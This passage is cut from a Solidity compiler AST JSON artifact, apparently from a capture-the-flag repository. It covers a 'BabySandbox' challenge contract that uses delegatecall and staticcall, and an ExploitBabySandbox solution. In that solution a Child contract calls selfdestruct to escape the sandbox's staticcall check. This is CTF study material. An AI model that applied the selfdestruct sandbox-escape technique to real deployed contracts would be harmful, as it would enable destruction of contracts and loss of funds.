                                                      "src": "569:14:0"
                                                    },
                                                    "nodeType": "YulFunctionCall",
                                                    "src": "569:16:0"
                                                  }
                                                ],
                                                "functionName": {
                                                  "name": "returndatacopy",
                                                  "nodeType": "YulIdentifier",
                                                  "src": "542:14:0"
                                                },
                                                "nodeType": "YulFunctionCall",
                                                "src": "542:44:0"
                                              },
                                              "nodeType": "YulExpressionStatement",
                                              "src": "542:44:0"
                                            },
                                            {
                                              "expression": {
                                                "arguments": [
                                                  {
                                                    "kind": "number",
                                                    "nodeType": "YulLiteral",
                                                    "src": "618:4:0",
                                                    "type": "",
                                                    "value": "0x00"
                                                  },
                                                  {
                                                    "arguments": [],
                                                    "functionName": {
                                                      "name": "returndatasize",
                                                      "nodeType": "YulIdentifier",
                                                      "src": "624:14:0"
                                                    },
                                                    "nodeType": "YulFunctionCall",
                                                    "src": "624:16:0"
                                                  }
                                                ],
                                                "functionName": {
                                                  "name": "return",
                                                  "nodeType": "YulIdentifier",
                                                  "src": "611:6:0"
                                                },
                                                "nodeType": "YulFunctionCall",
                                                "src": "611:30:0"
                                              },
                                              "nodeType": "YulExpressionStatement",
                                              "src": "611:30:0"
                                            }
                                          ]
                                        },
                                        "nodeType": "YulCase",
                                        "src": "509:154:0",
                                        "value": {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "514:1:0",
                                          "type": "",
                                          "value": "1"
                                        }
                                      }
                                    ],
                                    "expression": {
                                      "arguments": [
                                        {
                                          "arguments": [],
                                          "functionName": {
                                            "name": "gas",
                                            "nodeType": "YulIdentifier",
                                            "src": "274:3:0"
                                          },
                                          "nodeType": "YulFunctionCall",
                                          "src": "274:5:0"
                                        },
                                        {
                                          "name": "code",
                                          "nodeType": "YulIdentifier",
                                          "src": "281:4:0"
                                        },
                                        {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "287:4:0",
                                          "type": "",
                                          "value": "0x00"
                                        },
                                        {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "293:4:0",
                                          "type": "",
                                          "value": "0x00"
                                        },
                                        {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "299:4:0",
                                          "type": "",
                                          "value": "0x00"
                                        },
                                        {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "305:4:0",
                                          "type": "",
                                          "value": "0x00"
                                        }
                                      ],
                                      "functionName": {
                                        "name": "delegatecall",
                                        "nodeType": "YulIdentifier",
                                        "src": "261:12:0"
                                      },
                                      "nodeType": "YulFunctionCall",
                                      "src": "261:49:0"
                                    },
                                    "nodeType": "YulSwitch",
                                    "src": "254:409:0"
                                  }
                                ]
                              },
                              "condition": {
                                "arguments": [
                                  {
                                    "arguments": [],
                                    "functionName": {
                                      "name": "caller",
                                      "nodeType": "YulIdentifier",
                                      "src": "215:6:0"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "215:8:0"
                                  },
                                  {
                                    "arguments": [],
                                    "functionName": {
                                      "name": "address",
                                      "nodeType": "YulIdentifier",
                                      "src": "225:7:0"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "225:9:0"
                                  }
                                ],
                                "functionName": {
                                  "name": "eq",
                                  "nodeType": "YulIdentifier",
                                  "src": "212:2:0"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "212:23:0"
                              },
                              "nodeType": "YulIf",
                              "src": "209:2:0"
                            },
                            {
                              "body": {
                                "nodeType": "YulBlock",
                                "src": "745:50:0",
                                "statements": [
                                  {
                                    "expression": {
                                      "arguments": [
                                        {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "770:4:0",
                                          "type": "",
                                          "value": "0x00"
                                        },
                                        {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "776:4:0",
                                          "type": "",
                                          "value": "0x00"
                                        }
                                      ],
                                      "functionName": {
                                        "name": "revert",
                                        "nodeType": "YulIdentifier",
                                        "src": "763:6:0"
                                      },
                                      "nodeType": "YulFunctionCall",
                                      "src": "763:18:0"
                                    },
                                    "nodeType": "YulExpressionStatement",
                                    "src": "763:18:0"
                                  }
                                ]
                              },
                              "condition": {
                                "arguments": [
                                  {
                                    "arguments": [],
                                    "functionName": {
                                      "name": "gas",
                                      "nodeType": "YulIdentifier",
                                      "src": "730:3:0"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "730:5:0"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "737:6:0",
                                    "type": "",
                                    "value": "0xf000"
                                  }
                                ],
                                "functionName": {
                                  "name": "lt",
                                  "nodeType": "YulIdentifier",
                                  "src": "727:2:0"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "727:17:0"
                              },
                              "nodeType": "YulIf",
                              "src": "724:2:0"
                            },
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "928:4:0",
                                    "type": "",
                                    "value": "0x00"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "934:4:0",
                                    "type": "",
                                    "value": "0x00"
                                  },
                                  {
                                    "arguments": [],
                                    "functionName": {
                                      "name": "calldatasize",
                                      "nodeType": "YulIdentifier",
                                      "src": "940:12:0"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "940:14:0"
                                  }
                                ],
                                "functionName": {
                                  "name": "calldatacopy",
                                  "nodeType": "YulIdentifier",
                                  "src": "915:12:0"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "915:40:0"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "915:40:0"
                            },
                            {
                              "body": {
                                "nodeType": "YulBlock",
                                "src": "1234:50:0",
                                "statements": [
                                  {
                                    "expression": {
                                      "arguments": [
                                        {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "1259:4:0",
                                          "type": "",
                                          "value": "0x00"
                                        },
                                        {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "1265:4:0",
                                          "type": "",
                                          "value": "0x00"
                                        }
                                      ],
                                      "functionName": {
                                        "name": "revert",
                                        "nodeType": "YulIdentifier",
                                        "src": "1252:6:0"
                                      },
                                      "nodeType": "YulFunctionCall",
                                      "src": "1252:18:0"
                                    },
                                    "nodeType": "YulExpressionStatement",
                                    "src": "1252:18:0"
                                  }
                                ]
                              },
                              "condition": {
                                "arguments": [
                                  {
                                    "arguments": [
                                      {
                                        "kind": "number",
                                        "nodeType": "YulLiteral",
                                        "src": "1189:6:0",
                                        "type": "",
                                        "value": "0x4000"
                                      },
                                      {
                                        "arguments": [],
                                        "functionName": {
                                          "name": "address",
                                          "nodeType": "YulIdentifier",
                                          "src": "1197:7:0"
                                        },
                                        "nodeType": "YulFunctionCall",
                                        "src": "1197:9:0"
                                      },
                                      {
                                        "kind": "number",
                                        "nodeType": "YulLiteral",
                                        "src": "1208:1:0",
                                        "type": "",
                                        "value": "0"
                                      },
                                      {
                                        "arguments": [],
                                        "functionName": {
                                          "name": "calldatasize",
                                          "nodeType": "YulIdentifier",
                                          "src": "1211:12:0"
                                        },
                                        "nodeType": "YulFunctionCall",
                                        "src": "1211:14:0"
                                      },
                                      {
                                        "kind": "number",
                                        "nodeType": "YulLiteral",
                                        "src": "1227:1:0",
                                        "type": "",
                                        "value": "0"
                                      },
                                      {
                                        "kind": "number",
                                        "nodeType": "YulLiteral",
                                        "src": "1230:1:0",
                                        "type": "",
                                        "value": "0"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "staticcall",
                                      "nodeType": "YulIdentifier",
                                      "src": "1178:10:0"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "1178:54:0"
                                  }
                                ],
                                "functionName": {
                                  "name": "iszero",
                                  "nodeType": "YulIdentifier",
                                  "src": "1171:6:0"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1171:62:0"
                              },
                              "nodeType": "YulIf",
                              "src": "1168:2:0"
                            },
                            {
                              "cases": [
                                {
                                  "body": {
                                    "nodeType": "YulBlock",
                                    "src": "1503:135:0",
                                    "statements": [
                                      {
                                        "expression": {
                                          "arguments": [
                                            {
                                              "kind": "number",
                                              "nodeType": "YulLiteral",
                                              "src": "1540:4:0",
                                              "type": "",
                                              "value": "0x00"
                                            },
                                            {
                                              "kind": "number",
                                              "nodeType": "YulLiteral",
                                              "src": "1546:4:0",
                                              "type": "",
                                              "value": "0x00"
                                            },
                                            {
                                              "arguments": [],
                                              "functionName": {
                                                "name": "returndatasize",
                                                "nodeType": "YulIdentifier",
                                                "src": "1552:14:0"
                                              },
                                              "nodeType": "YulFunctionCall",
                                              "src": "1552:16:0"
                                            }
                                          ],
                                          "functionName": {
                                            "name": "returndatacopy",
                                            "nodeType": "YulIdentifier",
                                            "src": "1525:14:0"
                                          },
                                          "nodeType": "YulFunctionCall",
                                          "src": "1525:44:0"
                                        },
                                        "nodeType": "YulExpressionStatement",
                                        "src": "1525:44:0"
                                      },
                                      {
                                        "expression": {
                                          "arguments": [
                                            {
                                              "kind": "number",
                                              "nodeType": "YulLiteral",
                                              "src": "1597:4:0",
                                              "type": "",
                                              "value": "0x00"
                                            },
                                            {
                                              "arguments": [],
                                              "functionName": {
                                                "name": "returndatasize",
                                                "nodeType": "YulIdentifier",
                                                "src": "1603:14:0"
                                              },
                                              "nodeType": "YulFunctionCall",
                                              "src": "1603:16:0"
                                            }
                                          ],
                                          "functionName": {
                                            "name": "revert",
                                            "nodeType": "YulIdentifier",
                                            "src": "1590:6:0"
                                          },
                                          "nodeType": "YulFunctionCall",
                                          "src": "1590:30:0"
                                        },
                                        "nodeType": "YulExpressionStatement",
                                        "src": "1590:30:0"
                                      }
                                    ]
                                  },
                                  "nodeType": "YulCase",
                                  "src": "1496:142:0",
                                  "value": {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1501:1:0",
                                    "type": "",
                                    "value": "0"
                                  }
                                },
                                {
                                  "body": {
                                    "nodeType": "YulBlock",
                                    "src": "1662:135:0",
                                    "statements": [
                                      {
                                        "expression": {
                                          "arguments": [
                                            {
                                              "kind": "number",
                                              "nodeType": "YulLiteral",
                                              "src": "1699:4:0",
                                              "type": "",
                                              "value": "0x00"
                                            },
                                            {
                                              "kind": "number",
                                              "nodeType": "YulLiteral",
                                              "src": "1705:4:0",
                                              "type": "",
                                              "value": "0x00"
                                            },
                                            {
                                              "arguments": [],
                                              "functionName": {
                                                "name": "returndatasize",
                                                "nodeType": "YulIdentifier",
                                                "src": "1711:14:0"
                                              },
                                              "nodeType": "YulFunctionCall",
                                              "src": "1711:16:0"
                                            }
                                          ],
                                          "functionName": {
                                            "name": "returndatacopy",
                                            "nodeType": "YulIdentifier",
                                            "src": "1684:14:0"
                                          },
                                          "nodeType": "YulFunctionCall",
                                          "src": "1684:44:0"
                                        },
                                        "nodeType": "YulExpressionStatement",
                                        "src": "1684:44:0"
                                      },
                                      {
                                        "expression": {
                                          "arguments": [
                                            {
                                              "kind": "number",
                                              "nodeType": "YulLiteral",
                                              "src": "1756:4:0",
                                              "type": "",
                                              "value": "0x00"
                                            },
                                            {
                                              "arguments": [],
                                              "functionName": {
                                                "name": "returndatasize",
                                                "nodeType": "YulIdentifier",
                                                "src": "1762:14:0"
                                              },
                                              "nodeType": "YulFunctionCall",
                                              "src": "1762:16:0"
                                            }
                                          ],
                                          "functionName": {
                                            "name": "return",
                                            "nodeType": "YulIdentifier",
                                            "src": "1749:6:0"
                                          },
                                          "nodeType": "YulFunctionCall",
                                          "src": "1749:30:0"
                                        },
                                        "nodeType": "YulExpressionStatement",
                                        "src": "1749:30:0"
                                      }
                                    ]
                                  },
                                  "nodeType": "YulCase",
                                  "src": "1655:142:0",
                                  "value": {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1660:1:0",
                                    "type": "",
                                    "value": "1"
                                  }
                                }
                              ],
                              "expression": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1433:6:0",
                                    "type": "",
                                    "value": "0x4000"
                                  },
                                  {
                                    "arguments": [],
                                    "functionName": {
                                      "name": "address",
                                      "nodeType": "YulIdentifier",
                                      "src": "1441:7:0"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "1441:9:0"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1452:1:0",
                                    "type": "",
                                    "value": "0"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1455:1:0",
                                    "type": "",
                                    "value": "0"
                                  },
                                  {
                                    "arguments": [],
                                    "functionName": {
                                      "name": "calldatasize",
                                      "nodeType": "YulIdentifier",
                                      "src": "1458:12:0"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "1458:14:0"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1474:1:0",
                                    "type": "",
                                    "value": "0"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1477:1:0",
                                    "type": "",
                                    "value": "0"
                                  }
                                ],
                                "functionName": {
                                  "name": "call",
                                  "nodeType": "YulIdentifier",
                                  "src": "1428:4:0"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1428:51:0"
                              },
                              "nodeType": "YulSwitch",
                              "src": "1421:376:0"
                            }
                          ]
                        },
                        "evmVersion": "istanbul",
                        "externalReferences": [
                          {
                            "declaration": 3,
                            "isOffset": false,
                            "isSlot": false,
                            "src": "281:4:0",
                            "valueSize": 1
                          }
                        ],
                        "id": 6,
                        "nodeType": "InlineAssembly",
                        "src": "106:1702:0"
                      }
                    ]
                  },
                  "documentation": null,
                  "functionSelector": "522bb704",
                  "id": 8,
                  "implemented": true,
                  "kind": "function",
                  "modifiers": [],
                  "name": "run",
                  "nodeType": "FunctionDefinition",
                  "overrides": null,
                  "parameters": {
                    "id": 4,
                    "nodeType": "ParameterList",
                    "parameters": [
                      {
                        "constant": false,
                        "id": 3,
                        "mutability": "mutable",
                        "name": "code",
                        "nodeType": "VariableDeclaration",
                        "overrides": null,
                        "scope": 8,
                        "src": "65:12:0",
                        "stateVariable": false,
                        "storageLocation": "default",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "typeName": {
                          "id": 2,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "65:7:0",
                          "stateMutability": "nonpayable",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "value": null,
                        "visibility": "internal"
                      }
                    ],
                    "src": "64:14:0"
                  },
                  "returnParameters": {
                    "id": 5,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "96:0:0"
                  },
                  "scope": 9,
                  "src": "52:1772:0",
                  "stateMutability": "payable",
                  "virtual": false,
                  "visibility": "external"
                }
              ],
              "scope": 10,
              "src": "24:1802:0"
            }
          ],
          "src": "0:1827:0"
        },
        "id": 0
      },
      "contracts/babysandbox/ExploitBabySandbox.sol": {
        "ast": {
          "absolutePath": "contracts/babysandbox/ExploitBabySandbox.sol",
          "exportedSymbols": {
            "Child": [
              42
            ],
            "ExploitBabySandbox": [
              72
            ]
          },
          "id": 73,
          "license": null,
          "nodeType": "SourceUnit",
          "nodes": [
            {
              "id": 11,
              "literals": [
                "solidity",
                "0.7",
                ".0"
              ],
              "nodeType": "PragmaDirective",
              "src": "0:22:1"
            },
            {
              "absolutePath": "contracts/babysandbox/SetupBabySandbox.sol",
              "file": "./SetupBabySandbox.sol",
              "id": 12,
              "nodeType": "ImportDirective",
              "scope": 73,
              "sourceUnit": 103,
              "src": "24:32:1",
              "symbolAliases": [],
              "unitAlias": ""
            },
            {
              "abstract": false,
              "baseContracts": [],
              "contractDependencies": [],
              "contractKind": "contract",
              "documentation": null,
              "fullyImplemented": true,
              "id": 42,
              "linearizedBaseContracts": [
                42
              ],
              "name": "Child",
              "nodeType": "ContractDefinition",
              "nodes": [
                {
                  "constant": false,
                  "id": 15,
                  "mutability": "immutable",
                  "name": "self",
                  "nodeType": "VariableDeclaration",
                  "overrides": null,
                  "scope": 42,
                  "src": "80:35:1",
                  "stateVariable": true,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_contract$_Child_$42",
                    "typeString": "contract Child"
                  },
                  "typeName": {
                    "contractScope": null,
                    "id": 13,
                    "name": "Child",
                    "nodeType": "UserDefinedTypeName",
                    "referencedDeclaration": 42,
                    "src": "80:5:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_Child_$42",
                      "typeString": "contract Child"
                    }
                  },
                  "value": {
                    "argumentTypes": null,
                    "id": 14,
                    "name": "this",
                    "nodeType": "Identifier",
                    "overloadedDeclarations": [],
                    "referencedDeclaration": -28,
                    "src": "111:4:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_Child_$42",
                      "typeString": "contract Child"
                    }
                  },
                  "visibility": "private"
                },
                {
                  "body": {
                    "id": 23,
                    "nodeType": "Block",
                    "src": "148:42:1",
                    "statements": [
                      {
                        "expression": {
                          "argumentTypes": null,
                          "arguments": [
                            {
                              "argumentTypes": null,
                              "expression": {
                                "argumentTypes": null,
                                "id": 19,
                                "name": "msg",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -15,
                                "src": "171:3:1",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_magic_message",
                                  "typeString": "msg"
                                }
                              },
                              "id": 20,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "memberName": "sender",
                              "nodeType": "MemberAccess",
                              "referencedDeclaration": null,
                              "src": "171:10:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address_payable",
                                "typeString": "address payable"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address_payable",
                                "typeString": "address payable"
                              }
                            ],
                            "id": 18,
                            "name": "selfdestruct",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -21,
                            "src": "158:12:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
                              "typeString": "function (address payable)"
                            }
                          },
                          "id": 21,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "158:24:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 22,
                        "nodeType": "ExpressionStatement",
                        "src": "158:24:1"
                      }
                    ]
                  },
                  "documentation": null,
                  "functionSelector": "919840ad",
                  "id": 24,
                  "implemented": true,
                  "kind": "function",
                  "modifiers": [],
                  "name": "check",
                  "nodeType": "FunctionDefinition",
                  "overrides": null,
                  "parameters": {
                    "id": 16,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "136:2:1"
                  },
                  "returnParameters": {
                    "id": 17,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "148:0:1"
                  },
                  "scope": 42,
                  "src": "122:68:1",
                  "stateMutability": "nonpayable",
                  "virtual": false,
                  "visibility": "external"
                },
                {
                  "body": {
                    "id": 40,
                    "nodeType": "Block",
                    "src": "220:101:1",
                    "statements": [
                      {
                        "clauses": [
                          {
                            "block": {
                              "id": 35,
                              "nodeType": "Block",
                              "src": "247:50:1",
                              "statements": [
                                {
                                  "expression": {
                                    "argumentTypes": null,
                                    "arguments": [
                                      {
                                        "argumentTypes": null,
                                        "expression": {
                                          "argumentTypes": null,
                                          "id": 31,
                                          "name": "msg",
                                          "nodeType": "Identifier",
                                          "overloadedDeclarations": [],
                                          "referencedDeclaration": -15,
                                          "src": "274:3:1",
                                          "typeDescriptions": {
                                            "typeIdentifier": "t_magic_message",
                                            "typeString": "msg"
                                          }
                                        },
                                        "id": 32,
                                        "isConstant": false,
                                        "isLValue": false,
                                        "isPure": false,
                                        "lValueRequested": false,
                                        "memberName": "sender",
                                        "nodeType": "MemberAccess",
                                        "referencedDeclaration": null,
                                        "src": "274:10:1",
                                        "typeDescriptions": {
                                          "typeIdentifier": "t_address_payable",
                                          "typeString": "address payable"
                                        }
                                      }
                                    ],
                                    "expression": {
                                      "argumentTypes": [
                                        {
                                          "typeIdentifier": "t_address_payable",
                                          "typeString": "address payable"
                                        }
                                      ],
                                      "id": 30,
                                      "name": "selfdestruct",
                                      "nodeType": "Identifier",
                                      "overloadedDeclarations": [],
                                      "referencedDeclaration": -21,
                                      "src": "261:12:1",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
                                        "typeString": "function (address payable)"
                                      }
                                    },
                                    "id": 33,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": false,
                                    "kind": "functionCall",
                                    "lValueRequested": false,
                                    "names": [],
                                    "nodeType": "FunctionCall",
                                    "src": "261:24:1",
                                    "tryCall": false,
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_tuple$__$",
                                      "typeString": "tuple()"
                                    }
                                  },
                                  "id": 34,
                                  "nodeType": "ExpressionStatement",
                                  "src": "261:24:1"
                                }
                              ]
                            },
                            "errorName": "",
                            "id": 36,
                            "nodeType": "TryCatchClause",
                            "parameters": null,
                            "src": "247:50:1"
                          },
                          {
                            "block": {
                              "id": 37,
                              "nodeType": "Block",
                              "src": "313:2:1",
                              "statements": []
                            },
                            "errorName": "",
                            "id": 38,
                            "nodeType": "TryCatchClause",
                            "parameters": null,
                            "src": "307:8:1"
                          }
                        ],
                        "externalCall": {
                          "argumentTypes": null,
                          "arguments": [],
                          "expression": {
                            "argumentTypes": [],
                            "expression": {
                              "argumentTypes": null,
                              "id": 27,
                              "name": "self",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 15,
                              "src": "234:4:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_Child_$42",
                                "typeString": "contract Child"
                              }
                            },
                            "id": 28,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "check",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 24,
                            "src": "234:10:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                              "typeString": "function () external"
                            }
                          },
                          "id": 29,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "234:12:1",
                          "tryCall": true,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 39,
                        "nodeType": "TryStatement",
                        "src": "230:85:1"
                      }
                    ]
                  },
                  "documentation": null,
                  "id": 41,
                  "implemented": true,
                  "kind": "fallback",
                  "modifiers": [],
                  "name": "",
                  "nodeType": "FunctionDefinition",
                  "overrides": null,
                  "parameters": {
                    "id": 25,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "208:2:1"
                  },
                  "returnParameters": {
                    "id": 26,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "220:0:1"
                  },
                  "scope": 42,
                  "src": "200:121:1",
                  "stateMutability": "nonpayable",
                  "virtual": false,
                  "visibility": "external"
                }
              ],
              "scope": 73,
              "src": "58:265:1"
            },
            {
              "abstract": false,
              "baseContracts": [],
              "contractDependencies": [
                42
              ],
              "contractKind": "contract",
              "documentation": null,
              "fullyImplemented": true,
              "id": 72,
              "linearizedBaseContracts": [
                72
              ],
              "name": "ExploitBabySandbox",
              "nodeType": "ContractDefinition",
              "nodes": [
                {
                  "constant": false,
                  "functionSelector": "237b5e96",
                  "id": 44,
                  "mutability": "mutable",
                  "name": "child",
                  "nodeType": "VariableDeclaration",
                  "overrides": null,
                  "scope": 72,
                  "src": "360:20:1",
                  "stateVariable": true,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 43,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "360:7:1",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "value": null,
                  "visibility": "public"
                },
                {
                  "body": {
                    "id": 56,
                    "nodeType": "Block",
                    "src": "400:45:1",
                    "statements": [
                      {
                        "expression": {
                          "argumentTypes": null,
                          "id": 54,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftHandSide": {
                            "argumentTypes": null,
                            "id": 47,
                            "name": "child",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 44,
                            "src": "410:5:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          },
                          "nodeType": "Assignment",
                          "operator": "=",
                          "rightHandSide": {
                            "argumentTypes": null,
                            "arguments": [
                              {
                                "argumentTypes": null,
                                "arguments": [],
                                "expression": {
                                  "argumentTypes": [],
                                  "id": 51,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "nodeType": "NewExpression",
                                  "src": "426:9:1",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_creation_nonpayable$__$returns$_t_contract$_Child_$42_$",
                                    "typeString": "function () returns (contract Child)"
                                  },
                                  "typeName": {
                                    "contractScope": null,
                                    "id": 50,
                                    "name": "Child",
                                    "nodeType": "UserDefinedTypeName",
                                    "referencedDeclaration": 42,
                                    "src": "430:5:1",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_contract$_Child_$42",
                                      "typeString": "contract Child"
                                    }
                                  }
                                },
                                "id": 52,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "426:11:1",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_Child_$42",
                                  "typeString": "contract Child"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_Child_$42",
                                  "typeString": "contract Child"
                                }
                              ],
                              "id": 49,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "418:7:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 48,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "418:7:1",
                                "typeDescriptions": {
                                  "typeIdentifier": null,
                                  "typeString": null
                                }
                              }
                            },
                            "id": 53,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "418:20:1",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          },
                          "src": "410:28:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "id": 55,
                        "nodeType": "ExpressionStatement",
                        "src": "410:28:1"
                      }
                    ]
                  },
                  "documentation": null,
                  "id": 57,
                  "implemented": true,
                  "kind": "constructor",
                  "modifiers": [],
                  "name": "",
                  "nodeType": "FunctionDefinition",
                  "overrides": null,
                  "parameters": {
                    "id": 45,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "397:2:1"
                  },
                  "returnParameters": {
                    "id": 46,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "400:0:1"
                  },
                  "scope": 72,
                  "src": "386:59:1",
                  "stateMutability": "nonpayable",
                  "virtual": false,
                  "visibility": "public"
                },
                {
                  "body": {
                    "id": 70,
                    "nodeType": "Block",
                    "src": "501:43:1",
                    "statements": [
                      {
                        "expression": {
                          "argumentTypes": null,
                          "arguments": [
                            {
                              "argumentTypes": null,
                              "id": 67,
                              "name": "child",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 44,
                              "src": "531:5:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "expression": {
                              "argumentTypes": null,
                              "arguments": [],
                              "expression": {
                                "argumentTypes": [],
                                "expression": {
                                  "argumentTypes": null,
                                  "id": 62,
                                  "name": "setup",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 59,
                                  "src": "511:5:1",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_contract$_SetupBabySandbox_$102",
                                    "typeString": "contract SetupBabySandbox"
                                  }
                                },
                                "id": 64,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "lValueRequested": false,
                                "memberName": "sandbox",
                                "nodeType": "MemberAccess",
                                "referencedDeclaration": 77,
                                "src": "511:13:1",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_function_external_view$__$returns$_t_contract$_BabySandbox_$9_$",
                                  "typeString": "function () view external returns (contract BabySandbox)"
                                }
                              },
                              "id": 65,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
